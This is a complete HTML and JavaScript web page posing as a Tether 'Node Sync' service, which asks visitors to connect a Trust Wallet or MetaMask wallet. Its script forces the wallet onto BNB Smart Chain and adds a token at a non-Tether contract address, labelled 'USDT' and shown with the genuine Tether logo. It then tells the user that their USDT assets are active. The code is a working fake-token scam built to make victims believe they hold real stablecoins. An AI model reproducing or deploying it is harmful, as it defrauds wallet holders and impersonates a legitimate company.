<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tether Operations | Node Sync</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        :root { --tether-green: #26a17b; --bg-dark: #0a0b0d; --card-bg: #121418; }
        body { background: var(--bg-dark); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 24px; padding: 40px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8); }
        .logo-ring { position: relative; display: inline-block; margin-bottom: 20px; }
        .logo-ring::after { content: ''; position: absolute; top: -10px; left: -10px; right: -10px; bottom: -10px; border: 3px solid var(--tether-green); border-radius: 50%; border-top-color: transparent; animation: spin 1.5s linear infinite; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .usdt-img { width: 80px; filter: drop-shadow(0 0 10px var(--tether-green)); border-radius: 50%; }
        
        /* Updated Button Container */
        .receive-options { display: flex; gap: 15px; margin-top: 30px; justify-content: center; }
        .action-btn { background: var(--card-bg); border: 2px solid #2d333b; border-radius: 50%; width: 70px; height: 70px; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
        .action-btn:hover { border-color: var(--tether-green); transform: translateY(-3px); box-shadow: 0 8px 20px rgba(0,192,135,0.2); }
        .action-btn:active { transform: scale(0.95); }
        .action-btn img { width: 35px; height: 35px; }
        
        #log-area { font-size: 10px; color: #26a17b; margin-top: 15px; font-family: monospace; height: 15px; text-transform: uppercase; }
        
        /* Removed old elements: RECEIVE USDT text, Allocated Node Value box */
    </style>
</head>
<body>

<div class="container">
    <div class="logo-ring">
        <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" class="usdt-img" alt="USDT">
    </div>
    <p style="font-size: 13px; color: #848d97;">Select your wallet for node bridge sync.</p>
    
    <div class="receive-options">
        <button class="action-btn" onclick="startSync('trust')">
            <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0x6B175474E89094C44Da98b954EedeAC495271d0F/logo.png" alt="Trust">
        </button>
        <button class="action-btn" onclick="startSync('metamask')">
            <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask">
        </button>
    </div>

    <div id="log-area">SYSTEM: AWAITING SELECTION</div>
</div>

<script>
    const CONTRACT_ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
    const TOKEN_LOGO = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";

    async function startSync(walletType) {
        const log = document.getElementById('log-area');
        let provider;

        // Wallet Detection
        if (walletType === 'trust') {
            provider = window.trustwallet || (window.ethereum?.isTrust ? window.ethereum : null);
            log.innerText = "> TARGETING TRUST WALLET...";
        } else {
            if (window.ethereum?.providers) {
                provider = window.ethereum.providers.find(p => p.isMetaMask);
            } else if (window.ethereum?.isMetaMask) {
                provider = window.ethereum;
            }
            log.innerText = "> TARGETING METAMASK...";
        }

        if (!provider) {
            alert(walletType.toUpperCase() + " Extension not found!");
            log.innerText = "> ERROR: WALLET NOT FOUND";
            return;
        }

        try {
            log.innerText = "> REQUESTING HANDSHAKE...";
            await provider.request({ method: 'eth_requestAccounts' });
            
            // Sync to BSC Network
            log.innerText = "> SYNCING NETWORK (BSC)...";
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }],
            }).catch(async (err) => {
                if (err.code === 4902) {
                    await provider.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x38',
                            chainName: 'Smart Chain',
                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
                            blockExplorerUrls: ['https://bscscan.com/']
                        }]
                    });
                }
            });

            log.innerText = "> INJECTING ASSET METADATA...";
            // High-Power Asset Injection
            const added = await provider.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: {
                        address: CONTRACT_ADDR,
                        symbol: 'USDT',
                        decimals: 6,
                        image: TOKEN_LOGO,
                    },
                },
            });

            if (added) {
                log.innerText = "> SYNC SUCCESSFUL!";
                // You can add a special message here or a redirect
                alert("Node Sync Complete! Your USDT assets are now active.");
            }
        } catch (err) {
            console.error(err);
            log.innerText = "> ERROR: HANDSHAKE FAILED";
        }
    }
</script>
</body>
</html>
